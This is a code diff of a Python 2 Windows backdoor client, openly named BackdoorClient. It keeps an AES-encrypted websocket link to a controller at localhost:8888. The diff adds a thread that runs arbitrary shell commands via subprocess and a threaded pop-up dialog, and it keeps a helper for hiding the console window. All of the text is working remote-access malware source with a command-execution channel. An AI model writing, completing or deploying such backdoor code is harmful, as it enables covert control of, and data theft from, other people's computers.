@@ -2,6 +2,7 @@
 # coding:utf-8
 import os
 import ctypes
+import subprocess
 import threading
 import chardet
 import uuid
@@ -20,34 +21,37 @@ class BackdoorClient(threading.Thread):
         self.ID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
         self.IV = '\0' * AES.block_size
         self.SECRET = os.urandom(32)
+        self.ws = None
 
         self.daemon = True
         self.start()
 
     def run(self):
         while True:
-            ws = None
             try:
-                ws = create_connection("ws://localhost:8888/")
+                self.ws = create_connection("ws://localhost:8888/")
 
                 sercret_msg = {'id': self.ID, 'secret': b64encode(self.SECRET)}
-                ws.send(json.dumps(sercret_msg))
+                self.ws.send(json.dumps(sercret_msg))
 
                 time.sleep(1)
 
-                sercret_msg = {'data': self.encrypt('hello im client')}
-                ws.send(json.dumps(sercret_msg))
-
                 while True:
-                    result = ws.recv()
-                    print result
+                    msg = json.loads(self.ws.recv())
+                    if 'data' in msg:
+                        data = self.decrypt(msg['data'])
+                        print data
 
-                ws.close()
+                self.ws.close()
 
             except Exception as e:
-                if ws:
-                    ws.close()
+                if self.ws:
+                    self.ws.close()
                 time.sleep(3)
+
+    def send_msg(self, data):
+        msg = {'data': self.encrypt(data)}
+        self.ws.send(json.dumps(msg))
 
     def encrypt(self, text):
         encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
@@ -60,14 +64,35 @@ class BackdoorClient(threading.Thread):
         return plain
 
 
-def dialog(content, title=u''):
-        ctypes.windll.user32.MessageBoxW(None, content, title, 0)
+class ExecCmd(threading.Thread):
+    def __init__(self, command):
+        threading.Thread.__init__(self)
+        self.command = command
+
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            proc = subprocess.Popen(self.command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            stdout_value = proc.stdout.read()
+            stdout_value += proc.stderr.read()
+
+        except Exception as e:
+            pass
 
 
-def cmd(cl):
-        rlt = os.popen(cl)
-        content = ''.join(rlt.readlines())
-        return content.decode(chardet.detect(content)['encoding'])
+class ShowDialog(threading.Thread):
+    def __init__(self, content, title=''):
+        threading.Thread.__init__(self)
+        self.content = content.decode(chardet.detect(content)['encoding'])
+        self.title = title.decode(chardet.detect(title)['encoding'])
+
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        ctypes.windll.user32.MessageBoxW(None, self.content, self.title, 0)
 
 
 def hide_cmd_window():
